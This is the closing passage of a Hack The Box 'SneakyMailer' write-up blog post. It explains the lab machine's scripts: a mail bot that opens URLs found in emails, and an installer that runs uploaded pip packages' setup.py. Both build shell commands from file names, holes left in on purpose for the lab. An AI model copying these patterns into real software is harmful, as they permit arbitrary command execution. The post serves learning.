</pre></table></code></div></div><h3 id="how-vmail-works">How vmail works</h3><p>The first directory is <code class="highlighter-rouge">vmail</code> and was in charge of reading the user’s emails, getting the possible URL on them, trying to log in to that URL, then clean the mailbox.</p><ul><li><code class="highlighter-rouge">imap-user-login.py</code> did the first part by getting the email and logging in:</li></ul><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">active_threads</span>
    <span class="c1"># Connecting to the server
</span>    <span class="n">client</span> <span class="o">=</span> <span class="n">imaplib</span><span class="p">.</span><span class="n">IMAP4</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">143</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="c1"># Reading mails
</span>    <span class="n">client</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="s">"Inbox"</span><span class="p">)</span>
    <span class="n">type_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">"ALL"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">():</span>
        <span class="k">while</span> <span class="n">active_threads</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="n">mail_type</span><span class="p">,</span> <span class="n">mail_data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">fetch</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="s">'(RFC822)'</span><span class="p">)</span>
        <span class="n">raw_email</span> <span class="o">=</span> <span class="n">mail_data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">process_email</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">raw_email</span><span class="p">,</span> <span class="p">)).</span><span class="n">start</span><span class="p">()</span>
        <span class="n">active_threads</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="c1"># Finally delete the mail
</span>        <span class="n">client</span><span class="p">.</span><span class="n">store</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="s">'+FLAGS'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Deleted'</span><span class="p">)</span>
    <span class="k">while</span> <span class="n">active_threads</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="n">client</span><span class="p">.</span><span class="n">expunge</span><span class="p">()</span>
    <span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">client</span><span class="p">.</span><span class="n">logout</span><span class="p">()</span>
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">restore-sent-mail-box.py</code> cleared the mailbox and added the two emails that we saw earlier.</li></ul><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="n">original_email</span> <span class="ow">in</span> <span class="n">original_emails</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">original_emails</span><span class="p">[</span><span class="n">original_email</span><span class="p">]:</span>
        <span class="n">sent_mail</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">original_email</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="how-low-works">How low works</h3><p>The file <code class="highlighter-rouge">install-modules.py</code> in <code class="highlighter-rouge">low</code> was just designed to get the uploaded package, execute it and then delete all the files (<code class="highlighter-rouge">install-modules.sh</code> just ran <code class="highlighter-rouge">install-modules.py</code>).</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">get_modules_file</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://pypi.sneakycorp.htb:8080/packages/"</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
    <span class="k">return</span> <span class="nb">tuple</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">module</span><span class="p">:</span> <span class="n">module</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">],</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"&gt;.+&lt;\/a"</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)))</span>


<span class="k">def</span> <span class="nf">uninstall_module</span><span class="p">(</span><span class="n">file_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">f"/home/low/venv/bin/pip uninstall </span><span class="si">{</span><span class="n">file_name</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'.tar.gz'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">f"/var/www/pypi.sneakycorp.htb/packages/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">install_module</span><span class="p">(</span><span class="n">file_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">tempfile</span><span class="p">.</span><span class="n">TemporaryDirectory</span><span class="p">()</span> <span class="k">as</span> <span class="n">temporary_folder</span><span class="p">:</span>
        <span class="c1"># Decompress the tar
</span>        <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">f"/usr/bin/tar -C </span><span class="si">{</span><span class="n">temporary_folder</span><span class="si">}</span><span class="s"> -zxf /var/www/pypi.sneakycorp.htb/packages/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="c1"># Run the installation process
</span>        <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">f"/usr/bin/screen -d -m /opt/scripts/low/install-module.sh </span><span class="si">{</span><span class="n">temporary_folder</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">file_name</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'.tar.gz'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="si">}</span><span class="s">/setup.py &amp;"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="conclusion">Conclusion</h2><p>This is everything, I hope you enjoyed the writeup and learned something new. It was one of the best boxes I’ve done, learned a lot not only about Python but also about how to automate stuff ans some interesting techniques! If you liked it you can give me respect on Hack The Box through the following link: <a href="https://www.hackthebox.eu/home/users/profile/31531">https://www.hackthebox.eu/home/users/profile/31531</a>. Until next time!</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >FTP</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >Enumeration</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/john/" class="post-tag no-text-decoration" >John</a> <a href="/tags/mail/" class="post-tag no-text-decoration" >Mail</a> <a href="/tags/pip/" class="post-tag no-text-decoration" >Pip</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: SneakyMailer write-up - GoDiego&url=https://diego95root.github.io/posts/SneakyMailer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: SneakyMailer write-up - GoDiego&u=https://diego95root.github.io/posts/SneakyMailer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox: SneakyMailer write-up - GoDiego&url=https://diego95root.github.io/posts/SneakyMailer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://diego95root.github.io/posts/SneakyMailer/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Fuse/">HackTheBox: Fuse write-up</a></li><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li><li><a href="/posts/Cache/">HackTheBox: Cache write-up</a></li><li><a href="/posts/Blunder/">HackTheBox: Blunder write-up</a></li><li><a href="/posts/Admirer/">HackTheBox: Admirer write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Fuse/" class="btn btn-outline-primary"><p>HackTheBox: Fuse write-up</p></a> <a href="/posts/Passage/" class="btn btn-outline-primary"><p>HackTheBox: Passage write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Admirer/"><div class="card-body"> <span class="timeago small"> Jun 3, 2020 <i class="unloaded">2020-06-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Admirer write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was one of the most interesting machines I’ve solved in Hack The Box, learned some cool techniques. It taught me how recon never ends, despite having foun...</p></div></div></a></div><div class="card"> <a href="/posts/Canape/"><div class="card-body"> <span class="timeago small"> Sep 15, 2018 <i class="unloaded">2018-09-15T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Canape write-up</h3><div class="text-muted small"><p>Hack The Box: Canape machine write-up This is by far the funniest and most educative machine I’ve rooted on Hack The Box. You start enumerating a git repository which leaks the source of the app r...</p></div></div></a></div><div class="card"> <a href="/posts/Fuse/"><div class="card-body"> <span class="timeago small"> Aug 21, 2020 <i class="unloaded">2020-08-21T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Fuse write-up</h3><div class="text-muted small"><p>Hack The Box: Fuse machine write-up Fuse was a Windows box that I found to be pretty complex despite it’s medium difficulty rating. It is mostly based on thorough enumeration on different services...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-167902069-1', 'auto'); ga('send', 'pageview'); </script> --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167902069-1" crossorigin="anonymous"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-167902069-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://diego95root.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
